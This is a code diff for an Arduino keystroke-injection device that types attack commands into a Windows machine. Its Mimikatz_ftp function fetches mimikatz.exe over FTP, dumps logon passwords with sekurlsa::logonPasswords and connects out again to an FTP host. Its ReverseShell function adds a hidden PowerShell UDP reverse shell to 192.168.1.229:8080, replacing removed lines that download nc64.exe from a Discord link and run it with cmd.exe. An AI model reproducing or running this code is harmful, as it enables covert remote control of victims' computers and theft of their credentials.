@@ -1,10 +1,9 @@
-#include <phukdlib_leonardo.h>
 
 
 void DirectoryGrabber(){
 
   Keyboard.begin();
-/*
+
   delay(500);
 
   delay(2000);
@@ -19,19 +18,13 @@ void DirectoryGrabber(){
   Keyboard.releaseAll();
 
   // Ending stream
-  Keyboard.end();
-  */
-  delay(2000);
-  Keyboard.print(F(" - / : ; ' <  > $  & ? ! = "));
-  Keyboard.releaseAll();
-
-  // Ending stream
-  Keyboard.end();  
+  Keyboard.end(); 
 }
 
 void Mimikatz_ftp() {
   delay(2000);
   Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   delay(2000);
@@ -44,21 +37,19 @@ void Mimikatz_ftp() {
   Keyboard.releaseAll();
   delay(3000);
   Keyboard.press(KEY_LEFT_ARROW);
-  delay(100);
-  Keyboard.releaseAll();
-  delay(4000);
+  delay(2000);
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
   delay(3000);
   Keyboard.println("ftp");
   delay(3000);
-  Keyboard.println("open 192.168.1.210");
-  delay(10000);
+  Keyboard.println("open 192.168.1.229");
+  delay(1000);
   Keyboard.println("pi");
-  delay(3000);
+  delay(1000);
   Keyboard.println("kali");
-  delay(5000);
+  delay(2000);
   Keyboard.println("binary");
   delay(2000);
   Keyboard.println("GET mimikatz.exe");
@@ -72,12 +63,12 @@ void Mimikatz_ftp() {
   Keyboard.println("privilege::debug");
   delay(3000);
   Keyboard.println("sekurlsa::logonPasswords full");
-  delay(10000);
+  delay(1000);
   Keyboard.println("exit");
   delay(3000);
   Keyboard.println("ftp");
   delay(3000);
-  Keyboard.println("open 10.1.206.174");
+  Keyboard.println("open 192.168.1.229");
   delay(10000);
   Keyboard.println("pi");
   delay(3000);
@@ -258,31 +249,40 @@ void Scanner() {
 
 void ReverseShell() {
   
+ Keyboard.begin();
+
   // Wait 500ms
   delay(500);
 
-  delay(1000);
+  delay(1500);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
 
-  delay(1000);
-  Keyboard.print(F("cmd"));
+  delay(500);
+  Keyboard.print(F("powershell -NoP -NonI -W hidden"));
 
+  delay(250);
   Keyboard.press(KEY_RETURN);
+
+  delay(200);
+  Keyboard.print(F("$E=New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse(\"192.168.1.229\"),8080);$C=New-Object System.Net.So"));
+
+  delay(100);
+  Keyboard.print(F("ckets.UDPClient(53);[byte[]]$B=0..65535|%{0};$SB=([text.encoding]::ASCII).GetBytes('ReverseDuckyIII:');$C.Send($SB,$S"));
+
+  delay(100);
+  Keyboard.print(F("B.Length,$E);while($true){;$R=$C.Receive([ref]$E);$RD=([text.encoding]::ASCII).GetString($R);$s=(iex $RD 2>&1 | Out-S"));
+
+  delay(100);
+  Keyboard.print(F("tring );$s2=$s+'Ducky@PS ' + (pwd).Path + '> ';$SB =([text.encoding]::ASCII).GetBytes($s2);$C.Send($SB,$SB.Len"));
+
+  delay(100);
+  Keyboard.print(F("gth,$E)};$C.Close()"));
+  
   Keyboard.releaseAll();
 
-  delay(1000);
-  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 \n"));
-
   Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-
-  delay(3000);
-  Keyboard.print(F("START /MIN a.exe <192.168.1.210> <8080> -e cmd.exe -d & exit \n"));
-
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
 
   // Ending stream
   Keyboard.end();
